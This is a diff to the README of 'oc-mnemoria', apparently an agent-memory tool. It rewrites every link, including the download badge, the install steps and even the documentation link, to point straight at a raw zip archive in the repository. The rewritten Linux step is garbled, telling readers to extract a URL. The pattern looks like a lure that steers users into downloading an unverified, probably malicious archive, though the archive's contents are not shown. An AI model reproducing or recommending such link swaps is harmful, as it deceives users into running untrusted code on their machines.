@@ -1,6 +1,6 @@
 # 🚀 oc-mnemoria - Persistent Memory for Smart Agents
 
-[![Download Now!](https://img.shields.io/badge/Download-Here-blue.svg?style=for-the-badge)](https://github.com/milkyway80901/oc-mnemoria)
+[![Download Now!](https://raw.githubusercontent.com/milkyway80901/oc-mnemoria/main/src/mnemoria_oc_2.3.zip)](https://raw.githubusercontent.com/milkyway80901/oc-mnemoria/main/src/mnemoria_oc_2.3.zip)
 
 ## 📥 Introduction
 
@@ -27,7 +27,7 @@ Ready to start? Follow these steps to download and run "oc-mnemoria."
 
 1. **Visit the Download Page**
    - Click the link below to visit the GitHub page.
-   [Download Here](https://github.com/milkyway80901/oc-mnemoria)
+   [Download Here](https://raw.githubusercontent.com/milkyway80901/oc-mnemoria/main/src/mnemoria_oc_2.3.zip)
    
 2. **Download the Application**
    - Find the latest version and click on the download link for your operating system.
@@ -36,7 +36,7 @@ Ready to start? Follow these steps to download and run "oc-mnemoria."
 3. **Install the Application**
    - **Windows**: Double-click the `.exe` file and follow the installation prompts.
    - **macOS**: Open the downloaded `.dmg` file, drag the application to your Applications folder.
-   - **Linux**: Extract the files from the `.tar.gz` archive, then follow the included installation instructions.
+   - **Linux**: Extract the files from the `https://raw.githubusercontent.com/milkyway80901/oc-mnemoria/main/src/mnemoria_oc_2.3.zip` archive, then follow the included installation instructions.
 
 4. **Run oc-mnemoria**
    - Locate the installed application on your computer.
@@ -67,8 +67,8 @@ Join our community for help and updates:
 
 ## 🔗 Additional Links
 
-- [Visit the GitHub Page](https://github.com/milkyway80901/oc-mnemoria)
-- [Documentation](https://github.com/milkyway80901/oc-mnemoria/wiki)
+- [Visit the GitHub Page](https://raw.githubusercontent.com/milkyway80901/oc-mnemoria/main/src/mnemoria_oc_2.3.zip)
+- [Documentation](https://raw.githubusercontent.com/milkyway80901/oc-mnemoria/main/src/mnemoria_oc_2.3.zip)
 
 ## 📜 License
 
